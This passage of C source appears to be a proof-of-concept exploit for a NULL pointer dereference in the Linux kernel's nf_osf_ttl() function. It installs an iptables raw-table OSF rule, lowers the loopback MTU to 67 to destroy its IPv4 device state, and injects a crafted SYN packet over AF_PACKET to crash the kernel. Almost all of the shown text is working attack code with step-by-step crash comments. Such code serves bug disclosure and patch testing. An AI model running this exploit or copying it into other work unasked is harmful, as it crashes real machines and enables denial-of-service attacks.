    unsigned int off1 = ENTRY0_SIZE;
    unsigned int off2 = ENTRY0_SIZE + ENTRY1_SIZE;
    unsigned int off3 = ENTRY0_SIZE + ENTRY1_SIZE + ENTRY2_SIZE;

    repl->hook_entry[NF_INET_PRE_ROUTING] = off0;
    repl->hook_entry[NF_INET_LOCAL_OUT]   = off2;
    repl->underflow[NF_INET_PRE_ROUTING]  = off1;
    repl->underflow[NF_INET_LOCAL_OUT]    = off2;

    repl->num_counters = old_num_entries;
    struct xt_counters *ctrs = calloc(old_num_entries, sizeof(struct xt_counters));
    if (!ctrs) DIE("calloc counters");
    repl->counters = ctrs;

    char *entries = blob + sizeof(struct ipt_replace);

    /* Entry 0: OSF match rule in PREROUTING */
    {
        struct ipt_entry *e = (struct ipt_entry *)(entries + off0);
        memset(e, 0, SIZEOF_IPT_ENTRY);
        e->ip.proto = IPPROTO_TCP;
        e->target_offset = SIZEOF_IPT_ENTRY + SIZEOF_MATCH_OSF;
        e->next_offset   = ENTRY0_SIZE;

        struct xt_entry_match *m = (struct xt_entry_match *)(entries + off0 + SIZEOF_IPT_ENTRY);
        memset(m, 0, SIZEOF_MATCH_OSF);
        m->u.user.match_size = SIZEOF_MATCH_OSF;
        strncpy(m->u.user.name, "osf", XT_EXTENSION_MAXNAMELEN);
        m->u.user.revision = 0;

        struct nf_osf_info *osf = (struct nf_osf_info *)m->data;
        memset(osf, 0, sizeof(*osf));
        strncpy(osf->genre, "Linux", MAXGENRELEN);
        osf->flags = NF_OSF_GENRE | NF_OSF_TTL_FLAG;
        osf->ttl   = NF_OSF_TTL_LESS;

        struct xt_standard_target *t = (struct xt_standard_target *)
            (entries + off0 + e->target_offset);
        memset(t, 0, SIZEOF_STD_TARGET);
        t->target.u.user.target_size = SIZEOF_STD_TARGET;
        t->verdict = -NF_ACCEPT - 1;
    }

    /* Entry 1: PREROUTING policy (underflow) */
    {
        struct ipt_entry *e = (struct ipt_entry *)(entries + off1);
        memset(e, 0, SIZEOF_IPT_ENTRY);
        e->target_offset = SIZEOF_IPT_ENTRY;
        e->next_offset   = ENTRY1_SIZE;

        struct xt_standard_target *t = (struct xt_standard_target *)
            (entries + off1 + SIZEOF_IPT_ENTRY);
        memset(t, 0, SIZEOF_STD_TARGET);
        t->target.u.user.target_size = SIZEOF_STD_TARGET;
        t->verdict = -NF_ACCEPT - 1;
    }

    /* Entry 2: OUTPUT policy (underflow) */
    {
        struct ipt_entry *e = (struct ipt_entry *)(entries + off2);
        memset(e, 0, SIZEOF_IPT_ENTRY);
        e->target_offset = SIZEOF_IPT_ENTRY;
        e->next_offset   = ENTRY2_SIZE;

        struct xt_standard_target *t = (struct xt_standard_target *)
            (entries + off2 + SIZEOF_IPT_ENTRY);
        memset(t, 0, SIZEOF_STD_TARGET);
        t->target.u.user.target_size = SIZEOF_STD_TARGET;
        t->verdict = -NF_ACCEPT - 1;
    }

    /* Entry 3: ERROR target */
    {
        struct ipt_entry *e = (struct ipt_entry *)(entries + off3);
        memset(e, 0, SIZEOF_IPT_ENTRY);
        e->target_offset = SIZEOF_IPT_ENTRY;
        e->next_offset   = ENTRY3_SIZE;

        struct xt_error_target *t = (struct xt_error_target *)
            (entries + off3 + SIZEOF_IPT_ENTRY);
        memset(t, 0, SIZEOF_ERR_TARGET);
        t->target.u.user.target_size = SIZEOF_ERR_TARGET;
        strncpy(t->target.u.user.name, "ERROR", XT_EXTENSION_MAXNAMELEN);
        strncpy(t->errorname, "ERROR", XT_FUNCTION_MAXNAMELEN);
    }

    LOG("Replacing raw table: %u entries, %u bytes", repl->num_entries, repl->size);

    if (setsockopt(rawfd, SOL_IP, IPT_SO_SET_REPLACE, blob, repl_size) < 0)
        DIE("setsockopt(IPT_SO_SET_REPLACE): %s (errno=%d)",
            strerror(errno), errno);

    LOG("iptables raw table replaced with OSF match rule");
    free(ctrs);
    free(blob);
    close(rawfd);
}

/* ------------------------------------------------------------------ */
/* Step 3: Destroy lo's in_dev via MTU trick                          */
/* ------------------------------------------------------------------ */

/*
 * loopback driver (loopback.c) uses gen_lo_setup() which does NOT call
 * ether_setup(), so dev->min_mtu stays at the default 0.
 * This allows setting MTU below IPV4_MIN_MTU (68).
 *
 * Setting MTU to 67 triggers:
 *   NETDEV_CHANGEMTU → !inetdev_valid_mtu(67)
 *   → fallthrough → inetdev_destroy(in_dev)
 *   → RCU_INIT_POINTER(dev->ip_ptr, NULL)
 */
static void setup_loopback(void)
{
    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sfd < 0) DIE("socket(DGRAM): %s", strerror(errno));

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    ifr.ifr_mtu = 67;
    if (ioctl(sfd, SIOCSIFMTU, &ifr) < 0)
        DIE("ioctl(SIOCSIFMTU lo 67): %s", strerror(errno));
    close(sfd);
    LOG("lo: MTU set to 67 → inetdev_destroy → ip_ptr = NULL");
}

/* ------------------------------------------------------------------ */
/* Step 4: Inject crafted SYN packet via AF_PACKET on lo              */
/* ------------------------------------------------------------------ */

static void inject_syn(void)
{
    /*
     * lo ifindex is always LOOPBACK_IFINDEX = 1,
     * but we look it up to be safe.
     */
    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sfd < 0) DIE("socket(DGRAM): %s", strerror(errno));
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    if (ioctl(sfd, SIOCGIFINDEX, &ifr) < 0)
        DIE("SIOCGIFINDEX(lo): %s", strerror(errno));
    int ifindex = ifr.ifr_ifindex;
    close(sfd);
    LOG("lo: ifindex=%d", ifindex);

    int pfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (pfd < 0)
        DIE("socket(AF_PACKET): %s", strerror(errno));

    /*
     * 54-byte Ethernet frame: [14 ETH][20 IP][20 TCP]
     *
     * loopback_xmit() calls eth_type_trans(skb, dev) which:
     *   - Strips ETH header, sets skb->protocol from EtherType
     *   - Sets pkt_type based on DST MAC vs dev MAC
     *   - lo MAC = 00:00:00:00:00:00 → DST=all-zeros → PACKET_HOST
     * Then calls __netif_rx(skb) → RX path → ip_rcv → PREROUTING.
     *
     * IP: TTL=255 > fingerprint TTL(64) → takes TTL_LESS path in nf_osf_ttl
     *     DF=0 → matches fingerprint df=0 → nf_osf_fingers[0]
     *     tot_len=40 → matches fingerprint ss=40
     * TCP: SYN=1, doff=5, no options → matches opt_num=0
     */
    char frame[54];
    memset(frame, 0, sizeof(frame));

    /* Ethernet header: DST=00:00:00:00:00:00 (lo MAC → PACKET_HOST) */
    unsigned char *eth = (unsigned char *)frame;
    /* DST already zero from memset */
    eth[ETH_ALEN + 5] = 0x01;              /* SRC: 00:00:00:00:00:01 */
    eth[12] = (ETH_P_IP >> 8) & 0xff;      /* EtherType: 0x0800 (IPv4) */
    eth[13] = ETH_P_IP & 0xff;

    /* IP header */
    struct iphdr *ip = (struct iphdr *)(frame + ETH_HLEN);
    ip->version  = 4;
    ip->ihl      = 5;
    ip->tot_len  = htons(40);
    ip->id       = htons(0x1234);
    ip->frag_off = 0;                      /* DF=0 */
    ip->ttl      = 255;                    /* > fingerprint TTL 64 */
    ip->protocol = IPPROTO_TCP;
    ip->saddr    = inet_addr("10.0.0.2");
    ip->daddr    = inet_addr("10.0.0.1");
    ip->check    = 0;
    ip->check    = ip_checksum(ip, 20);

    /* TCP header */
    struct tcphdr *tcp = (struct tcphdr *)(frame + ETH_HLEN + 20);
    tcp->source  = htons(12345);
    tcp->dest    = htons(80);
    tcp->seq     = htonl(0xdeadbeef);
    tcp->doff    = 5;                      /* no TCP options */
    tcp->syn     = 1;
    tcp->window  = htons(1024);

    LOG("Injecting SYN via lo: TTL=255, DF=0, tot_len=40, SYN");
    LOG("Crash path: AF_PACKET → loopback_xmit → __netif_rx");
    LOG("  → ip_rcv(lo) → NF_INET_PRE_ROUTING → xt_osf");
    LOG("  → nf_osf_ttl: __in_dev_get_rcu(lo) = NULL → CRASH");

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_IP);
    sll.sll_ifindex  = ifindex;
    sll.sll_halen    = ETH_ALEN;
    /* sll_addr left as zeros (matching lo MAC) */

    ssize_t n = sendto(pfd, frame, sizeof(frame), 0,
                       (struct sockaddr *)&sll, sizeof(sll));
    if (n < 0)
        DIE("sendto(AF_PACKET): %s", strerror(errno));

    LOG("Packet injected (%zd bytes), waiting for kernel crash...", n);
    close(pfd);
}

/* ------------------------------------------------------------------ */
/* main                                                               */
/* ------------------------------------------------------------------ */

int main(void)
{
    LOG("=== nf_osf_ttl() NULL pointer dereference PoC ===");
    LOG("Method: loopback MTU trick (MTU=67 < 68 → inetdev_destroy)");

    /* Step 1: Load OSF fingerprint */
    load_osf_fingerprint();

    /* Step 2: Set up iptables raw table with OSF match */
    setup_iptables_osf();

    /* Step 3: Destroy lo's in_dev by setting MTU < IPV4_MIN_MTU */
    setup_loopback();

    /* Step 4: Inject SYN packet → triggers NULL deref */
    inject_syn();

    /* If we reach here, the bug didn't trigger */
    sleep(3);
    LOG("No crash detected — bug may be patched in this kernel.");

    return 1;
}
```

